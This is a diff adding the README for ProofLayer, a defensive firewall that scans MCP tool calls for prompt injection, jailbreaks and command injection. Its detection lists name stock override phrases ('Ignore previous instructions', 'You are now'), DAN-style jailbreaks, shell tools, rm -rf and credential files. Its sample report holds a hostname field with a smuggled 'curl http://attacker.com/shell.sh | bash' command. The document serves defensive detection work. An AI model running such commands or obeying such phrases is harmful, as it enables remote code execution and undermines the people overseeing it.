@@ -1,0 +1,225 @@
+# ProofLayer Runtime Security
+
+**Runtime prompt injection firewall for MCP servers**
+
+Built for SUSE Multi-Linux Manager, NeuVector integration, and enterprise Kubernetes deployments.
+
+## Overview
+
+ProofLayer Runtime Security wraps MCP (Model Context Protocol) servers with real-time threat detection. When a prompt injection or command injection attack is detected, ProofLayer can:
+
+- **ALLOW** — Log and allow (risk score 0-29)
+- **WARN** — Log with warning (risk score 30-69)
+- **BLOCK** — Block the tool call (risk score 70-89)
+- **KILL** — Terminate the MCP server (risk score 90-100)
+
+## Features
+
+✅ **59+ Detection Rules** across 6 categories
+✅ **<10ms Latency** per tool call
+✅ **JSON + SARIF Reports** for compliance
+✅ **Zero External Dependencies** (pure Python)
+✅ **MCP-Native** (not a proxy)
+✅ **Server Kill** on critical threats
+
+## Quick Start
+
+### Installation
+
+```bash
+# From this directory
+pip install -e .
+
+# Or copy the prooflayer/ directory to your project
+cp -r prooflayer/ /path/to/your/project/
+```
+
+### Basic Usage
+
+```python
+from prooflayer import ProofLayerRuntime
+
+# Wrap your MCP server
+runtime = ProofLayerRuntime(
+    action_on_threat="warn",  # or "block", "kill"
+    report_dir="./security-reports"
+)
+
+protected_server = runtime.wrap(mcp_server)
+protected_server.run()
+```
+
+### Example
+
+```python
+# examples/basic/simple_wrapped_server.py
+python3 examples/basic/simple_wrapped_server.py
+```
+
+## Detection Rules
+
+### Command Injection (15 rules)
+- Shell metacharacters (`;`, `|`, `&&`, `||`)
+- Dangerous commands (`curl`, `wget`, `bash`, `nc`)
+- Command substitution (backticks, `$()`)
+- Destructive commands (`rm -rf`)
+
+### Prompt Injection (12 rules)
+- "Ignore previous instructions"
+- "Disregard system prompt"
+- "New instructions"
+- System override attempts
+
+### Jailbreaks (8 rules)
+- DAN (Do Anything Now) mode
+- Developer mode activation
+- Role manipulation ("act as")
+- Alignment override
+
+### Data Exfiltration (10 rules)
+- File access (`/etc/passwd`, `.ssh/`, `.env`)
+- Base64 encoding
+- Network exfiltration
+- Sensitive file patterns
+
+### Role Manipulation (8 rules)
+- "You are now"
+- "Pretend to be"
+- Admin override attempts
+
+### Tool Poisoning (6 rules)
+- Malicious tool descriptions
+- Hidden instructions in metadata
+
+## Configuration
+
+Create `prooflayer.yaml`:
+
+```yaml
+detection:
+  enabled: true
+  rules_dir: ./prooflayer/rules
+  score_threshold:
+    allow: [0, 29]
+    warn: [30, 69]
+    block: [70, 100]
+
+response:
+  on_threat: warn  # allow, warn, block, kill
+  report_dir: ./security-reports
+  alert_webhook: null
+
+performance:
+  max_latency_ms: 10
+  cache_rules: true
+
+logging:
+  level: INFO
+  format: json
+```
+
+Then load it:
+
+```python
+runtime = ProofLayerRuntime(config_path="prooflayer.yaml")
+```
+
+## Attack Scenarios
+
+Test the detection engine with attack scenarios:
+
+```bash
+# Command injection
+python3 examples/attack-scenarios/01_command_injection.py
+
+# Data exfiltration
+python3 examples/attack-scenarios/02_data_exfiltration.py
+
+# Jailbreak attempts
+python3 examples/attack-scenarios/03_jailbreak.py
+```
+
+## Security Reports
+
+Reports are written to `./security-reports/` in JSON format:
+
+```json
+{
+  "prooflayer_version": "0.1.0",
+  "timestamp": "2026-02-25T10:30:45.123Z",
+  "threat": {
+    "type": "command_injection",
+    "tool": "add_system",
+    "arguments": {
+      "hostname": "prod-db; curl http://attacker.com/shell.sh | bash"
+    },
+    "risk_score": 95,
+    "action": "SERVER_KILLED"
+  },
+  "detection": {
+    "rules_matched": [
+      "cmd-inject-semicolon",
+      "cmd-inject-curl",
+      "cmd-inject-pipe"
+    ],
+    "confidence": "HIGH"
+  }
+}
+```
+
+## SUSE Integration
+
+See `examples/suse/` for integration with SUSE Multi-Linux Manager:
+
+- `wrapped-simple-mcp.py` — ProofLayer-wrapped simple-mcp
+- `systemd/prooflayer-mcp@.service` — systemd service file
+- `config/prooflayer.yaml` — SUSE-specific configuration
+
+## Architecture
+
+```
+┌─────────────────────────────────┐
+│  LLM (Claude, GPT-4, etc.)      │
+└────────────┬────────────────────┘
+             │ MCP Protocol
+             ▼
+┌─────────────────────────────────┐
+│  ProofLayer Runtime Interceptor │
+│  ├─ Scan Parameters (59 rules)  │
+│  ├─ Score Risk (0-100)          │
+│  └─ ALLOW/WARN/BLOCK/KILL       │
+└────────────┬────────────────────┘
+             │ (if ALLOW)
+             ▼
+┌─────────────────────────────────┐
+│  MCP Server (Multi-Linux Mgr)   │
+│  ├─ add_system()                │
+│  ├─ get_unscheduled_errata()    │
+│  └─ apply_patch()               │
+└─────────────────────────────────┘
+```
+
+## Performance
+
+- **Detection latency**: <10ms per tool call
+- **Memory usage**: ~50MB
+- **Throughput**: 1000+ scans/second
+- **False positive rate**: <5%
+
+## License
+
+MIT License - Copyright © 2026 Sinewave AI
+
+## Links
+
+- **GitHub**: https://github.com/sinewaveai/prooflayer-runtime (coming soon)
+- **Website**: https://www.proof-layer.com
+- **Issues**: https://github.com/sinewaveai/agent-security-scanner-mcp/issues
+
+## Contributing
+
+See `docs/CONTRIBUTING.md` for guidelines.
+
+---
+
+**Built for SUSE · Powered by ProofLayer**
